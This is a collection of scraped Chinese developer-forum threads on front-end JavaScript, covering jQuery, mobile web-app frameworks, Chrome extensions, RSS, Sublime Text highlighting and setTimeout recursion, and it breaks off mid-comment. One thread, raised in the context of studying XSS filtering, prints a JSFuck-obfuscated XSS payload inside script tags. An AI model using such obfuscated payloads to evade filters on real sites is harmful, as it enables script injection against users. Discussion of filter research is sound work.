{"content": ["<div class=\"topic_content\">- -感觉jquery挺丑的</div>"], "reply": "33", "tittle": "写前端 js 的时候，只用原生 js 现实吗", "comment": ["=。=   为啥丑。。。如果不用JS的话，可以考虑CoffeeScript或者TypeScript。\r", "\r", "只用原生js的话，你也得自己封装，要不怎么保证效率", "现实", "不是用jQuery写就丑，而是 jQuery 能让只能写丑代码的人也能写代码！\r", "\r", "请反省！", "在说一个web站点 or webApp 的前端这个前提下。\r", "\r", "要说原生js比jQuery性能好，在用对的情况下，是没问题的。\r", "可原生js比jQuery好看....这就理解不能了。\r", "\r", "如果单纯不喜欢 jQuery ， 使用先进写的前端框架配合 CoffeeScript ，写代码也比较容易的。\r", "\r", "只写原生js有种造轮子不用第三方库的感觉。", "只兼容到 IE9 的话可以不用 jQuery，原生 API 就挺好用；否则最好选个框架来提高开发效率。另外别用 CoffeeScript，除非团队强制使用。", "现实啊，jQuery 也是用原生 js 写出来的啊~ 大不了就自己实现一个~", "你自己用原生兼容IE？", "你不想用的原因只是丑的话，还是省省吧。省下来的时间干什么不好", "原生的js开发学习曲线太陡，但是一旦找到g点，开发过程中会充满一种无以言表的快感", "自己实现一个，然后还是抄JQ的源码。", "如果不是很大的项目，自己写写原生挺好的，但是如果是比较大的系统化的产品，还是别自己从底层写了，工作量太大，效果还不好。", "看了jquery的源码你会发现自己写原生js考虑的太少", "用原生 js 写,迟早有一天你会把 jquery 做过的重新做一遍", "楼主一定是初学者", "主要是jquery有cdn库，节约带宽", "最近在反思前端架构, 觉得小而美的项目用原生js或者jquery都ok, 大一点的项目是不是应该上 ", " 这样的框架?", " 大一点的项目上什么都无所谓了，因为过不了多久随着前端技术变迁肯定会重构（推倒重来）的:-)", " 这理由… 好无语", " 说说不推荐 Coffee 的理由?", "jQuery做了很多浏览器兼容，而且封装的API用起来也比较方便。论丑的话，DOM的API更甚吧？\r", "\r", "另外，了解JavaScript以后再学CoffeeScript。", "反正jQuery也是基于原生js\r", "楼主如果觉得不好用,可以自己用js或者jQuery封装一套.", " 其实也不止这个理由，论jquery丑不丑根本就是无稽之谈，有几个网民还会去查看你的js代码？你见过一个萌萌哒的小女生会右键查看源代码，然后惊呼还是document.getelementbyid好看，满篇的$选择器好丑么？", "楼主初心者无误。\r", "\r", "我们比一比就知道了\r", "\r", "获取特定id\r", "document.getElementById('foo')\r", "$('#foo')\r", "\r", "这都嫌麻烦和丑的话，请移步AngularJS，\r", "用我司同事的话说，\r", "原来10000行的少了8000行的\r", "当然，这要学习更多的东西和概念", " 当然啦，你这个观点是对的，但是 cdn 的理由… -_,- \r", "另外我觉得 $('selector') 要比 document.querySelectorAll 好看多了…", "楼主觉得丑，可以尝试一些编码规范，比如这个： ", "嫌丑只能造个更好的，坚定相信自己能超越他的话，不过，也许造完了才能发现真正是怎么回事。\r", "\r", "反正我不在乎美丑，也没那能力，提高开发效率省下时间做别的，不纠结。", "jquery的代码很丑，Angular代码维护起来更恶心，因为一个库要流行最重要的是易用，能让人更快开发出功能，而不是代码简单优雅，易于维护。\r", "所以我用 component 去做需要长期维护的项目，因为它有很多简洁的基础模块，易于修改，但是问题也很多，比如说浏览器兼容性、对于初学者不友好，模块升级导致的问题等等。\r", "因为大多数前端都是弄些糙快猛项目，所以没什么人关心代码质量了，或者说压根用不着。", "jQuery的API定义比原生的好太多了，新加的querySelector基本上就照抄了jQuery\r", "\r", "使用原生会有心理上的优越感，除此之外没有任何意义", " 写多了就知道了，语言本身设计有问题，而且受限于 JavaScript。", "jq丑的话，未知楼主有何优雅的js库产出呢？", "喜欢 del1214  的回答"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/gaearon/react-hot-loader\" rel=\"nofollow\">https://github.com/gaearon/react-hot-loader</a><br><br>看那个gif。不服不行。差异是通过diff 算法传输到reactjs实时更新的。mind ============&gt; blown</div>"], "reply": "10", "tittle": "react-hot-loader 我觉得我中文水平已经不能形容出这个东东有好酷了。", "comment": ["對視頻這麼做的話，是不是相當於重新發明了壓縮算法\r", "PiedPiper", "好像理解錯了", "省下换F5的钱了", "所见即所得啊。。", "所以说那些讨论哪种语言好的都是蛋疼，就一个js都能玩出神器来。。", "和 WebStorm 的 live edit 比如何？\r", "最近 virtual dom 很火的样子啊...我还在玩 Backbone & Marionette", "发现楼上都没 get 到楼主想要表达的...", "> 通过diff 算法传输到reactjs实时更新\r", "\r", "不是ls提醒我就会说，“grunt里不就有这样得插件吗”这样得话", "确实很赞，折腾了一天，比较坑的是 assets server 只能用 localhost，vagrant 里跑就完全不行，不知道是什么原理，刷新后 jsx 里的中文会有乱码，随便修改下 reload 后又自己好了，貌似又是一个坑 ..."]},
{"content": ["<div class=\"topic_content\">最近在做监控，想找些js的图表库来进行绘图。<br><br>就我了解的有highcharts，D3。highcharts 的接口不错，很容易编写。D3可以构建更复杂些的图表，就是代码也变的复杂，上手不容易。<br><br>其他的有哪些推荐的吗？</div>"], "reply": "7", "tittle": "有没有好的生成类似 rrdtool 那样的图表库", "comment": ["c3 - ", "地址竟然连起来，再贴c3： ", " 还算简单易用吧", " ^_^，就它了，百度出品，支持国产吧。", "rrdtool主要还是靠服务器资源来生成图表，好处是非常成熟。\r", "\r", "js图表动态性更好，不过对于有选择强迫症的人时煎熬。", "这两个也是比较容易上手的", "    "]},
{"content": ["<div class=\"topic_content\">Content Scripts，我定义了一个函数A()，函数A的功能为产生一个Alert。然后我在页面某处append了一个button(id为btn)，然后使用document.getElementById('btn').addEventListener(\"click\", A());来为这个button绑定一个事件，但是在我实际测试的时候发现，页面载入完毕后Alert就弹了出来，而且后续再点这个button却不会弹出Alert了。<br>不知道问题出在哪里，请教各位~</div>"], "reply": "5", "tittle": "请教一个 Chrome 插件开发的问题", "comment": ["而且我也试过document.getElementById('btn').onclick=A();也无效", "document.getElementById('btn').onclick=A;\r", "或\r", "document.getElementById('btn').addEventListener(\"click\", A);", " 那假如我A函数有参数呢？还有就是不太明白为何后续点button时没有反映", "- A()表达式是A函数的返回值。\r", "- 事件绑定的应该是函数。\r", "- 如果A方法接受参数应该在A函数里面返回另外一个函数。", " 讲明白了，谢！"]},
{"content": ["<div class=\"topic_content\">最近要做个支持 Android 和 iOS 的 web app，搜了一下发现选择挺多，有 jQuery Mobile, Sencha Touch, Titanium, Dojo Mobile 等等，眼花了。<br><br>想问下大家主要用的是哪个框架，有实际开发经验的欢迎分享下使用感受。</div>"], "reply": "47", "tittle": "web app 开发使用哪个框架最好？", "comment": ["个人觉得 Sencha Touch很不错， 但是学习成本很高", " 能说说 Sencha Touch 的优势么？我是倾向于用 jQuery Mobile 的毕竟熟悉，不过确实见到推荐 Sencha Touch 的人更多", "Sencha Touch 如果不做复杂应用的话可以.一旦内容复杂节点过多,android会卡到想吐...", " 是性能不行么？\r", "\r", "又发现一个 Zepto，彻底晕了。。。", "关键是性能，我也想知", "我比较倾向于用豆瓣和百度的，这两家开源了个自己的移动webapp框架，楼主可以看看", " 框架名称呢？", " 我查了，百度的叫 clouda，豆瓣的没查着", " clouda 是node框架把。后端的....\r", "\r", "Zepto JQuery 2.0 不带UI的， DIY的空间大。\r", "\r", "Zepto 虽然说和 JQuery API一直。但是还是有差别的。用Zepto的好处是代码小，如果不用考虑这些可以使用 JQuery 2.0\r", "\r", "Sencha Touch     带UI的， DIY的空间小\r", "JQuery Mobile    可以理解是带UI的 JQuery2.0", "再说一些\r", "Titanium 不是js框架。 是把web app封装成 native app的。提供一些native的接口。类似的有phoneGap", " 就目前定的计划来说，想找个能支持内容刷新、视图切换、侧边栏、模拟 pull 操作这些功能的框架", "你的需求。最方便的是用Sencha\r", "然后是Dojo Mobile 或者 jQuery Mobile", "以 UI 为主的是 Fundation 和 Bootstrap 吧，jQuery Mobile 和 Sencha Touch 太复杂", "可以看看 intel 的 appframework \r", "\r", "\r", "以前叫 jqmb 好像\r", "\r", "可以满足你的需求，jqmobile 有点太大了 ，wifi不给力的话 加载会很慢", "Avalon ", "\r", "不知道有没有朋友用过呢?...国产的应该也有好东西的吧..求经验", "  @", " 按照她的需求和提问方式\r", "1. 不是很了解js，或者single page app 的。用司徒的框架什么肯定完全不行\r", "2. 安她的需求够复杂，Bootstrap这种交互完全不够。做layeout还可以。\r", "3. 对于她的提问方式。对性能的要求肯定不高。\r", "\r", "那么就一步到位，少动脑子的方式比较好一些。", " 既然如此，先选 Sencha 用用看好了，多谢分析", "比较建议 foundation 或者 uikit// 前者的中文化比较弱，后者则比较强。\r", "我曾今很想吧 foundation v5 的文档给中文化过来的。。。可惜啊。///", "UI 和交互部分我目前用 zepto 和 百度的 gmu，说实话，不是太好用。。。", "Sencha touch真的，dom节点太多了，感觉是造成效率不高的原因", " 这2类框架不是一回事，Bootstrap和Fundation是CSS style为主，提供UI组件。\r", "jQMobile和Sencha是JS 为主，主要用来写GUI的逻辑。\r", "当然两者也有重叠的部分，前2个是用来做layout，后2个原来做交互界面逻辑", " so 我加了前提，以 UI 为主。具体选什么，还要看应用需要什么", "还是用原生的吧。类sencha的方案都有性能、代码安全等问题。", " Zepto 就是一个 jQuery 的轻量级替代品，几乎完全一样的 API，但是专门为 Mobile 或者 HTML5 浏览器设计和优化；因为觉得 jQuery 太大，而且由于兼容性的考虑而太慢，Zepto 就是为了这个出现的。你可以把它仅仅当作是一个为移动浏览器准备的 jQuery\r", "虽然 API 一样，但是还是很多细节不同，比如缺少以及添加了 API，以及一些 API 的执行结果不同。比如 $(xxx).width()\r", "\r", " 没必要一定有中文文档，本来技术方面的英文就不是特别的难，要了解和学习最新的东西，阅读英文是一个很有用和必要的能力。一个东西出了翻译了，那肯定都以及出来很久了。\r", "另外我觉得 layout 还是 Bootstrap 成熟，而且用的人多，也耐看", " 性能关键看优化，用一般写web app的方法直接用在在mobile上面，所有这些框架都慢。\r", "要特别注意资源的使用和释放，注意reflow之类的。", "Anjular js", "要跨平台感觉还是自己动手写控件比较好，因为很多框架在IOS上跑得很好但是android始终不给力，我也没找到android上好用的成品框架，目前还是手写中\r", "搭车问，大家对控件比较多的页面怎么处理的呢？比如tab+carousel+list等等，发现现在很多框架都采用单页+js动态加载，控制什么是挺方便的，不知道如果应用页面太多会不会造成性能问题", " Titanium和phonegap是不同的。前者是把js代码转换成原生代码执行，后者只是提供了native的一些api", "sencha的话就是能够很快的把东西实现出来，但是会对代码失去可控性，而现在mobile web app最大的问题就是性能，对性能不断调优是一个必然过程。", "1. WebApp+PhoneGap(2.0之后移交到Apache改名叫Cordova)\r", "\r", "a. Sencha touch首屈一指，我们团队开始的产品1.0-2.0就是选来选取最后落在了ST上。ST提供了直接打包成原生应用的能力，也就是说你不需要Cordova，当然有些接口可能你还是要用Cordova，因为ST提供的接口不完全。当然Sencha的开发模型就RIA来说看起来很2B不能接受，但我发现我后来自己用backbone+zepto，最后得出的结论跟ST差不多。其实这就是成熟化的组件开发模式，以前用wpf或者silverlight的RIA其实也是这个思路，当然代码量肯定略大。\r", "\r", "b. jqMobile，怎么说呢，前者1.1以前的版本有好几个性能问题，比如说一开始不用translate3d导致性能慢，不进行点击优化导致响应慢，还有坑爹的属性重新生成html的功能导致页面前渲染缓慢，还要手动的缓存页面，列表加速不行（ST也是到了2.1之后才做了元素复用优化），没有carousel控件(这个控件我写过两边，快速滑动，加速，切换加速，是否切换判定，其实还是挺复杂的)，所以都是用iScroll以及他们家的SwipeView和CardView做一些补充。总体来说，虽然你写起来跟jquery很像而且简单，但是会遇到各种性能问题，不知道现在如何了。\r", "\r", "c. dojo mobile，这个我用的少，我们在用ST之前有人用DojoMobile开发了一个其他产品，还行，但是跟ST比起来还是有点差距，控件和界面，并且DOJO的MVC体系不如ST的组件形态的MVC来的快。（App开发和桌面开发不同，App开发界面相对简单堆控件，桌面开发就有更多的交互和细节的问题要处理）\r", "\r", "上述的问题是，性能的优化会达到一个极限值，我们要做一些图形处理，在canvas上面已经优化到极致了，ios4s以上都是很流畅，但是在android上面就。。。。。。悲剧了。\r", "\r", "2. Runtime Titanium\r", "Titanium并不是把js编译成iOS或者android源码，而是在系统中跑一个v8或者spidermonkey，并且做一些jsbinding的工作讲原生层面的东西暴露成js接口，跟nodejs原理类似。当然很多游戏引擎，如unity3d可以用c#，js写，cocos2d-x可以用lua和js写脚本，机制差不多。TI将iOS同Android界面在一定程度上面做了一致性处理，可想而知，各个平台的特殊优势就难以发挥了。还好性能方面不必原生的差太多，那么成本上面也小了很多。\r", "\r", "3. 其他\r", "还有些技术是直接将ruby或者c#转化成ios代码的，大部分问题是只支持iOS。所以跟你写objc差不了多少。ThoughtWorks有个理念是逻辑层用js，界面层各自实现什么的。我只能说客户端的工作大部分是UI交互，所以意义也不是很大。\r", "\r", "最后说一下我们公司的项目。\r", "    一开始是ST+Cordova。\r", "    后来TI一路各种坑趟平，完全使用coffeescript替代javascript。后来太寂寞开始该Ti源代码。\r", "    图形层也改成Cocos2d-x，效率奇高。\r", "都是跨平台的技术。有兴趣的可以下载 银天下 这个app玩一下。\r", "\r", "介绍一下我们团队吧，我以前微软，后来自己出来创业2次（都因为各种原因跪了），现在在全国最大的贵金属券商-银天下做架构师。\r", "我们团队10+个人，负责公司所有移动端的技术研发以及后端的部分业务，清一色Mac全栈工程师，用coffeescript，ios，android，c++，rails，go等等。WebApp方面我们MobileWebApp我们用backbone+zepto.js，桌面的WebApp我们用angularjs，端到端测试做的也非常全面。大部分后端我们用nodejs，部分使用rails或者java（机器学习方面的东西）。所有好玩有用，新奇的技术我们都会尝试或者使用：）\r", "\r", "我们在2014年重点发展移动业务，所以将大力招聘（其实一直在招聘但是因为我们面试比较严格，技术很重要，但是因为我们很多时候要pair programming，所以性格也一样重要）。预计扩充到20-25人。\r", "\r", "擦，不知不觉就成了招聘贴了，好吧，继续无节操，希望有兴趣的朋友联系我，如果你是全栈工程师那就最好，如果你希望成为全栈工程师也不错哦。\r", "\r", "PS：我们这边的全栈工程师是，自己做交互设计，自己PS，自己写客户端，自己写服务器端，因为有些以前创业，你们懂得。还有个好处就是我们是一家金融企业，IT金融你们懂得。", " 用jquery的话还是要加一个fastclick框架来快速响应点击，去除因为双击等待判断延迟的300ms", " 刚才发没人搭理，正好请教这个问题\r", "对控件比较多的页面怎么处理的呢？比如tab+carousel+list等等，发现现在很多框架都采用单页+js动态加载，控制什么是挺方便的，不知道如果应用页面太多会不会造成性能问题", " WebApp性能问题是就是render和paint两步特别慢，所以首先要减少的是元素显示的数量，然后是元素的层级。还有就是动画用translate3d，避免使用某些css3高级技巧，点击优化什么的。\r", "\r", "举2个例子：\r", "\r", "1. carousel如果有10个item，那么实际上只有三个元素的display参数不会是none，就是当前显示的item以及prevItem和nextItem。\r", "\r", "2. list如果有100个数据，一个屏幕最多能显示8个，那么这个list里面可能只是用9个htmlnode节点去做渲染，最好每一个数据的现实格式是固定的（尤其是固定高度，当然宽度一个般都是固定的）\r", "\r", "当然上述两个情况Sencha Touch都帮你做好了。", " 我不追新，喜欢使用成熟的技术，选定后就想吃透，所以希望能借鉴大家的经验，选出一套靠谱的方案。非常感谢你做的分析和分享开发过程中的各种经验。另外，我也找到一篇 webapp 开发实践的文章 ", "   \r", "我大概有点头绪了，再次感谢诸位的回帖", "Ionic感觉不错，基于 angular，UI做的很像 ios 原生，可以跑在 phonegap 一类的平台上。", " 那么多个页面跳转你们是怎么处理的呢？我觉得这方面最初设计的时候应该是比较重要的，因为还涉及到浏览history，转场动画等等\r", "我感觉移动平台资源有限，不像web开发一样可以一个页面一个html，否则重复加载html也很消耗性能，我发现几个web app的框架都是单个html里面用js动态去加载或替换不同模板，达到页面切换的效果", "angular min", " 跳转是通过一个统一的navigationController来控制的，基本上就是一个CardView或者tabview。history记录根据当前页面名称啊，每个页面都有一个名称啊。", " 大神 TI 是什么？", "   我最近也在看web app框架 不知道LZ最后选择的什么？", " 我现在的方案是前端 AngularJS + Bootstrap，后端 Express+Sequelize", "   百度的是gmu么？豆瓣的在哪里？没找到", "  gmu哪里不好呢？   \r", "\r", "我刚在IOS的浏览器上试了一下他们的示例   \r", "\r", "速度没问题啊     难道是安卓上的性能不行？", " 性能和兼容永远是最大的问题", " 别说这么笼统啊  lz不是也尝试过了吗？现在这些框架都更新好几代了吧\r", "\r", "现在哪个比较好？", " 根据你团队的整体水平，你们产品的受众，进行选择。\r", "在这里的回答只能给你做一个起始参考，只有当你选择了一个方案并开始工程后，才能发现到底哪种方案是最适合你的。\r", "我的建议是如果你没用过别的方案，就用 AngularJS 吧", " ", " 这个？"]},
{"content": ["<div class=\"topic_content\">xss一些人用unicode字符来替换关键字已经很常见了但是对于这种代码是怎么执行的比较好奇<br><br><br>&lt;script&gt;[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()&lt;/script&gt;</div>"], "reply": "10", "tittle": "研究 XSS 过滤只是很好奇这种 js 是怎么样编码的？", "comment": ["应该是有个map可以映射unicode和关键字", " 搜索了一下貌似是这种映射\r", "\r", "突然觉得要把 0-9 a-z凑齐的话那也应该算是蛮拼的了吧。", "  好东西收藏之", "之前研究过, 这类代码仅在 JS 文件或 Script 标签能运行, 转义好字符就没有太大问题了.", "研究过类似的 ", " 这个已经坏了 =。=-", "这不是jsfuck么", "jsfuck，請Google", " "]},
{"content": ["<div class=\"topic_content\">rt，有什么好的算法可以将立体图形转换成为对应的解剖模型</div>"], "reply": "2", "tittle": "把立体图形转换成为解剖图形的算法", "comment": ["opencv 我同学貌似有搞这东西的，就是将摄像头拍摄的东西做成切面图", " 我就是想要达到这种结果 可否留下联系方式 想请教一下这方面的问题"]},
{"content": "", "reply": "1", "tittle": "@sneezry 会不会有出 JavaScript 书的计划？", "comment": [" 不知道你有没在除了V2和图灵外的地方提到过呢 感觉挺多电商都上架了 但知道的人不太多\r", "\r", "还有你又打算出些前端JavaScript方面的书吗？"]},
{"content": ["<div class=\"topic_content\">想给自己的浏览器做一个首页，显示最常去的一些网站有没有更新。最好这个网页的文件可以放在本地，不用放到服务器上。<br><br>想着用JS来读取RSS，但是AJAX只能读取same origin。如果用jsonp绕过，又需要目标格式是json，而rss又不是json。很多网上的方法都用googleapi，用起来也不方便。<br><br>所以用本地html+js获取远程rss有可能做到吗？</div>"], "reply": "8", "tittle": "本地 Javascript 可以读取 RSS 吗？", "comment": ["试试yahoo的yql？", "找个服务器中转，把xml转成json？", "adobe air可以满足这个需求，因为它的sandbox允许跨域ajax。", "yql 是个办法。\r", "\r", "如果你使用Firefox 有个现成的addon： mPage 刚好满足你的要求。", "Chrome 的话直接做成 extension？", "firefox用Greasemonkey，chrome用Tampermonkey，随便你怎么写跨域", "Google api rss", "可以,做成浏览器拓展,比如chrome就有本地的RSS拓展,可以订阅RSS"]},
{"content": ["<div class=\"topic_content\">之前曾发帖子 ( /111809 ) 表示要写 Sublime Text 的 JavaScript 语法高亮，经过一段时间的折腾感觉差不多可以邀请大家测试一番了，请查看 <a target=\"_blank\" href=\"https://github.com/P233/Syntax-highlighting-for-JavaScript\" rel=\"nofollow\">https://github.com/P233/Syntax-highlighting-for-JavaScript</a><br><br>需要禁用内置的或者第三方 JavaScript 语法高亮，然后设置语言为 `JS`<br><br>无法配合所有的 color scheme，推荐使用自己修改过的 Birds of Paradise 主题（ <a target=\"_blank\" href=\"https://github.com/P233/Birds-of-Paradise-for-TextMate\" rel=\"nofollow\">https://github.com/P233/Birds-of-Paradise-for-TextMate</a> ）或者 tomorrow 及 Monokai， 当然也可以根据 scopes list 修改自己喜欢的主题。<br><br>主要功能包括：<br>* 更好的高亮效果<br>* 函数名支持 Goto Symbol 以及 Goto Symbol in Project<br>* 支持 Doc​blockr 插件的 @<a href=\"/member/rule\">rule</a><br>* JSON 格式 key value 双色高亮，错误提示<br>* 一些基础的 snippets<br><br>需要改进地方：<br>* 继续改进高亮效果<br>* 更多的自动补完<br><br>关于自动补完，fork 了 Sublime Text 的 jQuery 插件 ( <a target=\"_blank\" href=\"https://github.com/P233/jQuery\" rel=\"nofollow\">https://github.com/P233/jQuery</a> )，配合这个语法高亮包使用时提示比较智能，比如 .show() 只有按下 . 之后才会提示，不会出现在其他地方。<br><br>希望大家能帮忙测试一番，并提出改进建议，感谢</div>", "<div class=\"topic_content\">刚刚修复了一处问题，请大家 pull 一下<br><br>拿 jQuery 源码做对比，两张截图，左侧是 Syntax highlighting for JavaScript 右侧是 Sublime Text 原生的<br><br><a target=\"_blank\" href=\"http://i.imgur.com/yKUeH0m.png\"><img src=\"http://i.imgur.com/yKUeH0m.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a><br><br>主要处理的部分是 属性 与 方法，还没处理的部分是参数，原生的高亮包中只有出现 function 这个关键字时才高亮参数。另外还在想要不要对 true false this 这几个做特殊处理<br><br><a target=\"_blank\" href=\"http://i.imgur.com/KlrYfFl.png\"><img src=\"http://i.imgur.com/KlrYfFl.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a><br><br>JSON 方面双色高亮，看起来舒服多了</div>"], "reply": "26", "tittle": "之前说要为 Sublime Text 写 JavaScript 语法高亮，现在邀请大家测试", "comment": ["赞一个", "我同时有st2,st3，弄哪个", "必须要弄了才知道？\r", "没有截图吗", " 2 3 一样的，2 在高亮方面有几个 bug 应该避开了，3 效率更高\r", "\r", " 已经补图 :)", " 用上了，确实比较智能。", " 不知道在哪禁用，好像有点混乱啊。st3的packages好像是空的", " 禁用可以通过 package control 的 disable package 选项，或者在 Settings - User 文件的 “ignored_packages” 部分添加一条 “JavaScript”\r", "\r", "ST3 的插件以 zip 文件的形式存在其他地方，也可以像 ST2 那样在 packages 文件夹下添加内容", " 谢谢，有空试试。", " 好像有bug，到了7000多行，就不会高亮了。\r", "\r", " ", "好像不一定是7000多行，我打开一个只有400多行的JS，到100多行后面就不会高亮了。", "有打算发布到Package Control吗？", " 感谢反馈，这个是附言中提过的 bug 应该已经修复了，请 git pull 后再试试\r", "\r", " Package Control 已经有 Java​Script​Next 这个插件了一般不会再接受功能相同的插件，除非非常有特色。之前提交过的 Swift 高亮已经被拒绝了，等这个更完善的时候会提交给 package control 希望不会被拒绝。 Java​Script​Next 写法很繁复，1900 行，很难修改，从头开始写只用了不到 150 行 :)", " 你看我文件夹丢这里可以吗？\r", "\r", " ", "好像是我放得有问题，我改成像主题一样，独立放一个文件夹就可以了。 =。=", " 可以的，不过最好新建个文件夹把 Preferences，Snippets，Syntaxes 等包裹起来，以后更新的时候只需要覆盖最外层的文件夹。截图中这样很不方便管理，过段时间可能都忘记这几个文件夹是什么了", " 呃，打字太慢了 哈哈", " 可以用了 :)。", "没看明白到底怎么安装啊。。。", " \r", "\r", "正则的中的引号会有些问题呢..", " \r", "\r", "第二个参数的小冒号..", "  非常感谢，周末修复好", " 应该都修复了，请 pull 后再试试，如果还有其他问题请不要客气提出来，再次感谢", "逗号的 scope 为啥是 comment.punctuation.comma.js\r", "原生的除了参数以外的情况是 meta.delimiter.object.comma.js\r", "\r", "还有感觉 true false 和 this 不分离出来确实挺不习惯的", " 想让逗号的颜色变淡一点，所以设定为注释的颜色，如果不习惯，可以通过修改 color scheme 文件改成默认的颜色，或者 fork 一份，删除针对逗号的高亮\r", "\r", "true false this 目前都是作为关键字高亮的，其实也想 换个方式呈现，只是还没想好，以后这部分会修改的\r", "\r", "感谢反馈！", "变淡属于个人喜好吧，tmLanguage + tmTheme 这套机制不就是像 html + css 一样把语义和表现分离开么，混着用就违背初衷了啊\r", "\r", "嘛，总之我先 fork 一份有空改改看了", " 由于各个 Color Scheme 的设计差异很大，如果完全语义化恐怕达不到最好的效果。比如，目前将 properties 高亮为 variable，不是语义化的，但是可以保证很多 Color Scheme 支持，而且可以保证高亮的颜色与其他部分有明显的区分。所以把 Scope 都列出来了，方便大家修改自己喜欢的 color scheme \r", "\r", "非常欢迎贡献代码 :)"]},
{"content": ["<div class=\"topic_content\">要求是效率尽量要高。不光是算法效率，还要考虑DOM元素操作的效率。大家有什么想法？<br>还有就是遇到类似这种问题解题技巧？</div>"], "reply": "104", "tittle": "看到一道面试题：<ul>有 10000 个<li>子元素，如何将这 10000 个<li>颠倒顺序。", "comment": ["五楼机智到 ==", "惊为天人...", "flex-direction:row-reverse", "5 楼 6666"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在用js处理任务的时候发生了栈溢出问题， 原来是递归调用函数的次数太多， 函数栈没有来得及释放导致， 用 setTimeout 调用递归函数解决了我的问题， 但是还有一些不明之处， 请大家指教！</p>\n\n<ol>\n<li>下面这个函数明显会导致栈溢出, 用node执行到 17000 多次的时候就报： RangeError: Maximum call stack size exceeded.</li>\n</ol>\n<div class=\"highlight\"><pre><span class=\"nx\">func1</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">i</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">i</span> <span class=\"o\">&gt;</span> <span class=\"mi\">1000000</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"nx\">func1</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"nx\">func1</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>\n</pre></div>\n\n<ol>\n<li>但是改成用 setTimeout 调用就不会。</li>\n</ol>\n<div class=\"highlight\"><pre><span class=\"nx\">func2</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">i</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">i</span> <span class=\"o\">&gt;</span> <span class=\"mi\">1000000</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"nx\">setTimeout</span><span class=\"p\">((</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"nx\">func2</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n    <span class=\"p\">}),</span> <span class=\"mi\">0</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"nx\">func2</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>\n</pre></div>\n\n<p>我的疑惑就是 setTimeout 中的函数调用时， 之前的函数堆栈有没有被释放呢？ 如果有的话变量 i 是怎么传进去的； 如果没有的话， 这段代码为什么不会栈溢出。</p>\n</div></div>"], "reply": "8", "tittle": "请教 setTimeout 为什么不会导致栈溢出？", "comment": ["前一个，直到栈溢出，第一次func1函数调用都没有结束。\r", "\r", "后一个\r", "return setTimeout((function() {\r", "      return func2(i);\r", "    }), 0);\r", "这一句之后，这一次func2函数就结束了。\r", "\r", "函数堆栈释放，变量i没有释放，具体请Google下 [闭包] 。", " \r", "嗯， 闭包的概念懂一些， 